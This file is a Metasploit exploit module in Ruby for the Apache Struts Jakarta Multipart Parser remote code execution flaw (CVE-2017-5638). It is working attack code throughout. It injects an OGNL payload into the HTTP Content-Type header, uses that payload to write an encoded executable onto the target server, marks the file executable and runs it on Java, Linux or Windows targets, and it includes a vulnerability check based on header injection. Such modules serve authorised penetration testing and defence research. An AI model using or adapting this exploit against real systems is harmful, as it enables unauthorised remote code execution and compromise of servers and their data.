##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Struts Jakarta Multipart Parser Remote Code Execution',
      'Description'    => %q{
        This module exploits a remote code execution vunlerability in Apache Struts
        version 2.3.5 - 2.3.31,  and 2.5 - 2.5.10. Remote Code Execution can be performed
        via http Content-Type header.
      },
      'Author'         => [ 'Nixawk' ],
      'References'     => [
        ['CVE', '2017-5638'],
        ['URL', 'https://cwiki.apache.org/confluence/display/WW/S2-045']
      ],
      'Platform'       => %w{ java linux win },
      'Privileged'     => true,
      'Targets'        =>
        [
          ['Windows Universal',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'win'
            }
          ],
          ['Linux Universal',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'linux'
            }
          ],
          [ 'Java Universal',
            {
              'Arch' => ARCH_JAVA,
              'Platform' => 'java'
            },
          ]
        ],
      'DisclosureDate' => 'Mar 07 2017',
      'DefaultTarget' => 2))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new('TARGETURI', [ true, 'The path to a struts application action', '/struts2-showcase/' ]),
          OptString.new('TMPPATH', [ false, 'Overwrite the temp path for the file upload. Needed if the home directory is not writable.', nil])
        ]
      )
  end

  def print_status(msg='')
    super("#{peer} - #{msg}")
  end

  def get_target_platform
    target.platform.platforms.first
  end

  def temp_path
    @TMPPATH ||= lambda {
      path = datastore['TMPPATH']
      return nil unless path

      case get_target_platform
      when Msf::Module::Platform::Windows
        slash = '\\'
      when
        slash = '/'
      else
      end

      unless path.end_with?('/')
        path << '/'
      end
      return path
    }.call
  end

  def send_http_request(payload)
    uri = normalize_uri(datastore["TARGETURI"])
    resp = send_request_cgi(
      'uri'     => uri,
      'version' => '1.1',
      'method'  => 'GET',
      'headers' => {
        'Content-Type': payload
      }
    )

    if resp && resp.code == 404
      fail_with(Failure::BadConfig, 'Server returned HTTP 404, please double check TARGETURI')
    end
    resp
  end

  def upload_exec(cmd, filename, content)
    var_a = rand_text_alpha_lower(4)
    var_b = rand_text_alpha_lower(4)
    var_c = rand_text_alpha_lower(4)

    cmd = Rex::Text.encode_base64(cmd)

    payload = "%{"
    payload << "(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."

    # save into a file / set file execution bit
    payload << "(##{var_a}=new sun.misc.BASE64Decoder())."
    payload << "(##{var_b}=new java.io.FileOutputStream('#{filename}'))."
    payload << "(##{var_b}.write(new java.math.BigInteger('#{content}', 16).toByteArray()))."
    payload << "(##{var_b}.close())."
    payload << "(##{var_c}=new java.io.File(new java.lang.String('#{filename}')))."
    payload << "(##{var_c}.setExecutable(true))."
    payload << "(@java.lang.Runtime@getRuntime().exec(new java.lang.String(##{var_a}.decodeBuffer('#{cmd}'))))"
    payload << "}.multipart/form-data"

    send_http_request(payload)
  end

  def check
    var_a = rand_text_alpha_lower(4)
    var_b = rand_text_alpha_lower(4)

    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
    payload << ".addHeader('#{var_a}', '#{var_b}')"
    payload << "}.multipart/form-data"

    begin
      resp = send_http_request(payload)
    rescue Msf::Exploit::Failed
      return Exploit::CheckCode::Unknown
    end

    if resp && resp.code == 200 && resp.headers[var_a] == var_b
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    payload_exe = rand_text_alphanumeric(4 + rand(4))
    case target['Platform']
      when 'java'
        payload_exe = "#{temp_path}#{payload_exe}.jar"
        pl_exe = payload.encoded_jar.pack
        command = "java -jar #{payload_exe}"
      when 'linux'
        path = datastore['TMPPATH'] || '/tmp/'
        pl_exe = generate_payload_exe
        payload_exe = "#{path}#{payload_exe}"
        command = "/bin/sh -c #{payload_exe}"
      when 'win'
        path = temp_path || '.\\'
        pl_exe = generate_payload_exe
        payload_exe = "#{path}#{payload_exe}.exe"

        print_status(payload_exe)
        command = "cmd.exe /c #{payload_exe}"
      else
        fail_with(Failure::NoTarget, 'Unsupported target platform!')
    end

    pl_content = pl_exe.unpack('H*').join()

    print_status("Uploading exploit to #{payload_exe}, and executing it.")
    upload_exec(command, payload_exe, pl_content)
  end
end